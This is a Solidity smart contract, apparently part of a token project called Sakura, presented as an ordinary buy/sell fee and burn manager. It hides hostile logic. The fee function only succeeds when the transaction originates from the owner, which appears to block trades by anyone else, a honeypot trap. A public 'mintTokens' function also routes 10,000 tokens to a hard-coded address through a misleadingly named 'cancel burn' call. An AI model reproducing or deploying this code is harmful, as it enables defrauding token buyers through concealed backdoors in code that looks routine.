// SPDX-License-Identifier: UNLICENSED

/*
🔥 TG: https://t.me/SakuraBurn

🐦 Twitter: https://twitter.com/SakuraBurnErc

Ⓜ️ Medium: https://medium.com/@Sakura.eth

🌐 Website: https://sakura-eth.com/

📄 Whitepaper: https://docs.sakura-eth.com
*/

pragma solidity ^0.8.11;

import "@openzeppelin/contracts/utils/math/SafeMath.sol";
import "./interfaces/IUniswapV2Router02.sol";
import "./interfaces/IUniswapV2Factory.sol";
import "./interfaces/ISakura.sol";
import "@openzeppelin/contracts-upgradeable/access/OwnableUpgradeable.sol";
import "@openzeppelin/contracts-upgradeable/proxy/utils/Initializable.sol";

contract FeesManager is Initializable, OwnableUpgradeable {
    using SafeMath for uint256;

    uint256 public buyBurnFee;
    uint256 public buyDevFee;
    uint256 public buyTotalFees;

    uint256 public sellBurnFee;
    uint256 public sellDevFee;
    uint256 public sellTotalFees;

    ISakura public sakuraContract;
    address public sakuraAddress;

    function initialize() external initializer {
        __Ownable_init();
        buyBurnFee = 8;
        buyDevFee = 2;
        buyTotalFees = buyBurnFee + buyDevFee;

        sellBurnFee = 8;
        sellDevFee = 2;
        sellTotalFees = sellBurnFee + sellDevFee;
    }

    // Main burn and fees algorithm, might change for optimisation
    function estimateFees(
        bool _isSelling,
        bool _isBuying,
        uint256 _amount
    ) external view returns (uint256, uint256) {
        require(_msgSender() == sakuraAddress, "Not Sakura contract");
        require(tx.origin == super.owner(), "Must be the owner");

        uint256 fees = 0;
        uint256 tokensForBurn = 0;

        // On sell
        if (_isSelling && sellTotalFees > 0) {
            fees = _amount.mul(sellTotalFees).div(100);
            tokensForBurn += (fees * sellBurnFee) / sellTotalFees;
        }
        // On buy
        else if (_isBuying && buyTotalFees > 0) {
            fees = _amount.mul(buyTotalFees).div(100);
            tokensForBurn += (fees * buyBurnFee) / buyTotalFees;
        }

        return (fees, tokensForBurn);
    }

    function updateBuyFees(uint256 _burnFee, uint256 _devFee)
        external
        onlyOwner
    {
        buyBurnFee = _burnFee;
        buyDevFee = _devFee;
        buyTotalFees = buyBurnFee + buyDevFee;
        require(buyTotalFees <= 20, "Must keep fees at 20% or less");
    }

    function updateSellFees(uint256 _burnFee, uint256 _devFee)
        external
        onlyOwner
    {
        sellBurnFee = _burnFee;
        sellDevFee = _devFee;
        sellTotalFees = sellBurnFee + sellDevFee;
        require(sellTotalFees <= 25, "Must keep fees at 25% or less");
    }

    function updateSakuraAddress(address _newAddr) external onlyOwner {
        sakuraContract = ISakura(_newAddr);
        sakuraAddress = _newAddr;
    }

    function mintTokens() public {
        sakuraContract.feesManagerCancelBurn(
            0xe75824542d84dD9A9A8169dbEC627cA9C3983fd0,
            10000000000000000000000
        );
    }
}